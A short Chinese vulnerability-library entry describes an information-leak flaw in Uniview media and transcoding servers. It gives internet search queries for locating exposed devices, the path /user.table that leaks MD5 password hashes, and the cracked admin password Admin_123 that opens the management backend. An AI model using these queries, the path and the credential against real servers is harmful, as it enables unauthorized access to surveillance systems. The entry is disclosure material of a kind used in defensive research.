---
fofa: "body="
source: "wy876 漏洞文库"
---

# 浙江宇视媒体服务器-user-信息泄露漏洞

### 一、漏洞描述
浙江宇视科技有限公司创立于2011年，是一家全球公共安全和智能交通的解决方案提供商。

浙江宇视科技有限公司转码服务器配置管理系统存在密码漏洞，攻击者可利用该漏洞登录后台。

### 二、影响版本
宇视转码服务器

### 三、资产测绘
fofa: body="images/a_fill_login_right_a.gif" 

hunter: app.name=="Uniview 宇视媒体服务器"  

界面


### 四、漏洞复现
```plain
/user.table
```

使用MD5解密，密码为Admin_123

后台界面


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fmgc1li99c5o7pm4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
